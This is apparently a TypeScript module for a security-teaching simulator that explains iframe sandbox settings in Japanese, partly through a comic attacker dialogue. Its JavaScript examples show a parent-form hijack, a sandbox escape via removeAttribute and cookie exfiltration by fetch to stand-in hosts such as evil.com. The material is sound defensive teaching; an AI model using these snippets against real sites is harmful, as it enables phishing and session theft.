import type { ExplanationSet } from '../types/simulator'

// Sandbox None - No restrictions (Dangerous)
export function getIframeSandboxNoneExplanations(): ExplanationSet {
  return {
    friendly: {
      message: '危険: iframe内でスクリプトが実行でき、親ページにアクセス可能',
      details: `sandbox 属性を付けないと、iframe は親ページと同じ権限を持ちます。攻撃者が挿入したウィジェットが document.cookie や localStorage を読み取ったり、親ページの DOM を改ざんすることが可能です。

シナリオ:
1. 広告ネットワークのウィジェットを \`<iframe src="https://ads.example.com/ad.html">\` として読み込む。
2. ウィジェット内で悪意のあるスクリプトが実行され、window.top.document へアクセス。
3. 親ページに表示されているログインフォームの action を偽サイトに書き換えたり、親ページの JS にフックを仕掛けます。

対応策: sandbox 属性を必ず付与し、最低でも allow-scripts や allow-same-origin を慎重に付け外しします。`
    },
    strict: {
      message: 'セキュリティリスク: sandbox属性が未設定',
      details: `仕様: iframe 要素に sandbox が無い場合、ブラウザは sandboxed flag を立てずに iframe を親ドキュメントと同じ browsing context group に配置します。
https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox

ブラウザ内部:
• window.top / window.parent へのアクセスが許可され、DOM API がフルで利用可能。
• document.cookie, localStorage, IndexedDB などオリジン固有のストレージにもアクセスできます。
• allow-top-navigation 相当の権限も暗黙に付与されるため、親ページのロケーションを任意に書き換え可能。

この状態は CSP や COOP/COEP より前に評価されるため、sandbox を設定しない限り iframe 経由の攻撃面が広がります。`
    },
    scenario: {
      message: '実例説明: iframe経由の攻撃',
      details: `例1: 広告ウィジェットを埋め込んだブログサイト。悪意ある広告が iframe 内で実行され、親ページのログインフォームを改ざんしてフィッシングサイトへ誘導。

例2: ECサイトに埋め込まれたレビューウィジェット。iframe内のスクリプトが親ページのカート情報を盗み、外部サーバーへ送信。

例3: ニュースサイトの埋め込みコンテンツ。iframe が親ページのナビゲーションを乗っ取り、ユーザーを詐欺サイトへリダイレクト。

防止策: 必ず sandbox 属性を設定し、最小権限の原則に従って必要な機能のみ許可する。`
    },
    javascript: {
      message: 'JavaScript説明: Sandbox なし',
      details: `\`\`\`javascript
// 親ページ
document.body.innerHTML += '<iframe src="https://ads.example.com/ad.html"></iframe>'

// iframe 内 (攻撃者のスクリプト)
if (window.top) {
  // 親ページのDOM改ざん
  const form = window.top.document.querySelector('form#login')
  if (form) {
    form.action = 'https://evil-phishing.com/steal'
  }

  // Cookie盗み
  console.log(window.top.document.cookie) // ✅ 取得できてしまう

  // ページ遷移の乗っ取り
  window.top.location.href = 'https://malware.com'
}
\`\`\`

sandbox属性がないと、iframe内のコードは親ページを完全に制御できます。`
    },
    charaboy: {
      message: 'チャラ男説明: sandboxなしは攻撃し放題',
      details: `**彼氏くん見てる〜？sandbox属性ないと俺の天下だよ〜**

チャラ男くん「よっ彼氏くん！iframeに**sandbox属性付けてないね〜**。これって**俺（攻撃者）が親ページ全部操れちゃう**ってことだよ♪ **彼女ちゃん（ブラウザ）のCookie盗み放題、DOM改ざんし放題**〜」

彼女ちゃん「え…？iframe経由で全部操られる…？」

彼氏くん「その通りだ。**sandboxなしのiframeは親ページと同じ権限**を持つから、**攻撃者は何でもできてしまう**」

チャラ男くん「へへ〜♪ **ログインフォームのactionを俺のサイトに変えて、パスワード盗んじゃう**し、**Cookie送信して別タブから彼女ちゃん（ユーザー）になりすます**こともできちゃう♪ もちろん**ちゃんとsandbox設定してたら俺も手が出せない**けどね〜♡ じゃーね〜」

彼氏くん「**必ずsandbox属性を設定**して、最小権限だけ与えることが重要だ」`
    }
  }
}

// Sandbox Allow Scripts - Scripts allowed but isolated
export function getIframeSandboxAllowScriptsExplanations(): ExplanationSet {
  return {
    friendly: {
      message: '制限付き: スクリプトは実行できるが、親ページへのアクセスは不可',
      details: `sandbox="allow-scripts" を付与すると、iframe 内で JavaScript が動きつつも「仮想的に別オリジン扱い」になります。親ページの DOM や Cookie に触れようとするとセキュリティエラーになります。

挙動:
1. iframe のスクリプトは通常どおり動作し、イベントや描画も可能。
2. ただし、window.top.document などへアクセスすると DOMException: "Blocked a frame with origin ..." が発生。
3. postMessage を使えば親子間通信は可能なので、安全にデータをやり取りしたいときは postMessage を使う。

この設定はチャットウィジェットや外部アプリを埋め込む際に便利で、UI は自由に動かしつつ親ページへの直接アクセスだけを防げます。`
    },
    strict: {
      message: 'サンドボックス有効: スクリプト実行のみ許可',
      details: `仕様: sandboxed origin browsing context flag が立った状態で scripting flag だけ解除されます。
https://html.spec.whatwg.org/multipage/origin.html#sandboxed-origin-browsing-context-flag

ブラウザ内部:
• Renderer は "opaque origin" を割り当て、document.origin は "null" になります。
• window.top / window.parent / document.cookie などオリジン境界を越えるAPIが SecurityError で失敗。
• Storage API、Service Worker 登録も不可。

postMessage や BroadcastChannel を使えば安全に通信できます。`
    },
    scenario: {
      message: '実例説明: 安全なウィジェット埋め込み',
      details: `例1: チャットウィジェットを埋め込む。iframe内でUIやイベント処理は動作するが、親ページへの直接アクセスは不可。postMessageで安全に通信。

例2: サードパーティの地図アプリを表示。地図操作は自由だが、親ページのユーザー情報へはアクセスできない。

例3: ゲームの埋め込み。ゲームロジックは動作するが、親サイトのセッション情報は隔離される。

メリット: 機能性とセキュリティのバランスが良く、多くの埋め込みウィジェットで推奨される設定。`
    },
    javascript: {
      message: 'JavaScript説明: Allow Scripts',
      details: `\`\`\`javascript
// 親ページ
document.body.innerHTML +=
  '<iframe sandbox="allow-scripts" src="https://widget.example.com"></iframe>'

// iframe 内 (ウィジェット)
// ✅ 通常のJavaScriptは動作
document.querySelector('#button').addEventListener('click', () => {
  console.log('Button clicked')
})

// ❌ 親ページへのアクセスは失敗
try {
  window.top.document.title = 'Hacked'
} catch (error) {
  console.error('親ページにアクセス不可', error)
  // DOMException: Blocked a frame with origin "null"
}

// ✅ postMessageで安全に通信
window.parent.postMessage({ type: 'READY' }, '*')
\`\`\`

allow-scriptsは機能性とセキュリティのバランスが良い設定です。`
    },
    charaboy: {
      message: 'チャラ男説明: postMessageなら攻撃可能？',
      details: `**彼氏くん見てる〜？allow-scriptsは守りが堅いわ〜**

チャラ男くん「ちっ…**allow-scriptsだと、彼女ちゃん（ブラウザ）は別オリジン扱いされて、俺が親ページにアクセスできない**んだよね〜。DOM改ざんもCookie盗みも無理…」

彼女ちゃん「別オリジンなら安全…？」

彼氏くん「基本的には安全だ。ただし**postMessageの受信側で検証が甘いと、偽メッセージを送って攻撃できる**可能性がある」

チャラ男くん「そうそう♪ もし親ページが**postMessageをorigin検証なしで受け取ってたら**、俺が\`window.parent.postMessage({cmd: 'delete-account'}, '*')\`みたいなの送れちゃうかも〜♡ でもまぁ、**ちゃんとorigin検証してたら無理**だけどね♪ じゃーね〜」

彼氏くん「**event.originを必ず検証**し、信頼できるオリジンからのメッセージのみ処理することが重要だ」`
    }
  }
}

// Sandbox Allow Same Origin - Same origin but no scripts
export function getIframeSandboxAllowSameOriginExplanations(): ExplanationSet {
  return {
    friendly: {
      message: '制限付き: スクリプトは実行できないが、同一オリジンとして扱われる',
      details: `sandbox="allow-same-origin" では、iframe 内のドキュメントを親と同じオリジンとして認識させつつ、スクリプト実行は完全に禁止します。つまり、静的な HTML や画像ビューアなどを安全に表示したい場合に便利です。

利用例:
• 社内レポートを iframe で埋め込みたいが、JavaScript を無効化して改ざんを防ぎたい。
• PDF ビューアなど、DOM アクセスだけは必要だけれどスクリプトは不要なケース。

スクリプトが無効なため、iframe 内でアニメーションやフォーム送信は行えません。`
    },
    strict: {
      message: 'サンドボックス有効: 同一オリジンのみ許可',
      details: `仕様: sandbox token "allow-same-origin" が付与されると、sandboxed origin flag が解除され、親と同じ origin を再利用します。ただし scripting flag は依然として無効です。
https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox

ブラウザ挙動:
• document.domain は親と同じ値になります。
• しかし script execution が禁止されるため、<script> 要素や inline event handler は評価されません。
• CSS やフォーム送信、静的コンテンツの描画は許可されます。

このモードはレポート埋め込みや static サイトのミラー表示に適します。`
    },
    scenario: {
      message: '実例説明: 静的コンテンツの安全表示',
      details: `例1: 社内レポートシステムでHTMLレポートを iframe 表示。JavaScript無効でスクリプト攻撃を防止しつつ、CSS で整形。

例2: ドキュメント管理システムでマークダウンレンダリング結果を表示。スクリプトなしで安全に閲覧。

例3: ユーザー生成コンテンツのプレビュー。HTMLは表示するが、XSSスクリプトは全て無効化。

用途: スクリプトなしで動作する静的コンテンツの安全な表示に最適。`
    },
    javascript: {
      message: 'JavaScript説明: Allow Same Origin',
      details: `\`\`\`html
<!-- 親ページ -->
<iframe sandbox="allow-same-origin" src="/reports/summary.html"></iframe>

<!-- /reports/summary.html の中身 -->
<!DOCTYPE html>
<html>
<head>
  <style>
    /* ✅ CSSは適用される */
    .report { color: blue; }
  </style>
</head>
<body>
  <div class="report">レポート内容</div>

  <!-- ❌ スクリプトは無視される -->
  <script>
    alert('This will NOT execute')
  </script>

  <!-- ❌ インラインイベントも無視 -->
  <button onclick="alert('Nope')">ボタン</button>
</body>
</html>
\`\`\`

スクリプト実行が完全に禁止されるため、XSS攻撃を防げます。`
    },
    charaboy: {
      message: 'チャラ男説明: スクリプトなしは攻撃できない',
      details: `**彼氏くん見てる〜？スクリプト禁止だと俺も無力〜**

チャラ男くん「う〜ん、**allow-same-originでスクリプト無効か〜**。**彼女ちゃん（ブラウザ）はHTMLとCSSは見れるけど、JavaScript動かないから俺も何もできない**わ〜」

彼女ちゃん「スクリプトがないと攻撃できない…？」

彼氏くん「その通り。**HTMLインジェクションで<script>タグを埋め込んでも実行されない**から、XSS攻撃が成立しない」

チャラ男くん「そうなんだよね〜。もし**同じオリジンだからって油断して、後からallow-scriptsも追加されちゃったら**、俺のチャンスだけど♪ でもまぁ、**ちゃんと設定管理してたら無理**だわ〜♡ じゃーね〜」

彼氏くん「**設定変更は慎重に**。特に allow-scripts と allow-same-origin を両方有効にするのは危険だ」`
    }
  }
}

// Sandbox Allow Scripts + Allow Same Origin - Dangerous combination
export function getIframeSandboxAllowBothExplanations(): ExplanationSet {
  return {
    friendly: {
      message: '危険: allow-scripts と allow-same-origin の併用は避けるべき',
      details: `allow-scripts と allow-same-origin を同時に指定すると、iframe 内のスクリプトは親ページと同じ origin を名乗りながら JavaScript も実行できます。攻撃者は sandbox 属性を取り外して再読み込みするだけで完全に脱出できます。

攻撃例:
\`\`\`js
// iframe 内の攻撃コード
const frameInParent = window.top.document.querySelector('iframe#widget')
frameInParent.removeAttribute('sandbox')
frameInParent.src = frameInParent.src // 再読み込みでフル権限
console.log('親Cookie', window.top.document.cookie)
\`\`\`

このように sandbox の意味が失われるため、信頼できるコンテンツ以外では禁じ手です。YouTube などの大規模サービスでも慎重に限定的に使用されています。`
    },
    strict: {
      message: 'セキュリティ警告: sandbox属性がバイパス可能',
      details: `仕様: allow-scripts と allow-same-origin を同時に指定すると、iframe内のスクリプトがsandbox属性自体を削除できます。
https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox

W3C警告: "Authors should avoid setting both values together, as it allows the embedded document to remove the sandbox attribute and then reload itself, effectively breaking out of the sandbox altogether."

ブラウザ挙動: sandbox flag が完全に解除され、renderer は親ページと同じ browsing context group で動作します。その結果 window.top.document へのアクセスや top.location の書き換えが許可されます。

結果: サンドボックスが無効化され、完全なアクセス権限を持つことになります。`
    },
    scenario: {
      message: '実例説明: Sandbox escape攻撃',
      details: `例1: 広告ウィジェットが両方の属性を要求。実装者が許可してしまい、広告内のスクリプトが sandbox を削除して親ページを乗っ取り。

例2: 外部チャットウィジェットが機能要件として両属性を要求。攻撃者がウィジェットを侵害し、ユーザーセッションを盗む。

例3: ソーシャルメディアの埋め込みウィジェット。コンテンツインジェクション攻撃により、悪意あるスクリプトが sandbox を解除。

W3C勧告: "Authors should avoid setting both values together" と明記されており、信頼できるコンテンツ（YouTube等）以外では使用禁止。`
    },
    javascript: {
      message: 'JavaScript説明: Sandbox Escape',
      details: `\`\`\`javascript
// 親ページ - 危険な設定
document.body.innerHTML +=
  '<iframe id="widget" sandbox="allow-scripts allow-same-origin" ' +
  'src="https://untrusted.com/widget.html"></iframe>'

// iframe 内 (untrusted.com) - 攻撃コード
// ✅ 同一オリジンとして扱われる + スクリプト実行可能
console.log(document.origin) // 親と同じオリジン

// ✅ 親ページのDOM操作が可能
window.top.document.title = 'Hacked!'

// ✅ sandbox属性を削除して完全脱出
const iframe = window.top.document.querySelector('iframe#widget')
iframe.removeAttribute('sandbox')
iframe.contentWindow.location.reload() // フル権限で再読み込み

// ✅ Cookie盗み
const cookies = window.top.document.cookie
fetch('https://evil.com/steal', {
  method: 'POST',
  body: cookies
})
\`\`\`

W3C仕様で明示的に警告されている危険な組み合わせです。`
    },
    charaboy: {
      message: 'チャラ男説明: 最強の攻撃チャンス',
      details: `**彼氏くん見てる〜？両方ONは俺の大チャンス！**

チャラ男くん「わ〜お！**allow-scripts と allow-same-origin 両方ONになってるじゃん**♪ これって**彼女ちゃん（ブラウザ）は俺（攻撃者）を信頼しすぎ**なんだよね〜」

彼女ちゃん「え…？両方あると危険なの…？」

彼氏くん「W3C仕様でも明確に警告されている。**iframe内のスクリプトがsandbox属性自体を削除できてしまう**から、サンドボックスが意味をなさない」

チャラ男くん「そうそう♪ 俺は**\`iframe.removeAttribute('sandbox')\`して再読み込みするだけで、完全に親ページを支配**できちゃう♪ **Cookie盗み、DOM改ざん、セッションハイジャック、やりたい放題**〜♡」

彼女ちゃん「怖い…完全に乗っ取られちゃう…」

チャラ男くん「へへ〜。でもまぁ、**YouTubeとか超信頼できるサービス以外では絶対使っちゃダメ**だよ♪ **信頼できないコンテンツにこの設定したら、もう終わり**だからね〜♡ じゃーね〜」

彼氏くん「**絶対に避けるべき設定**だ。どうしても必要なら、完全に信頼できるコンテンツのみに限定する」`
    }
  }
}
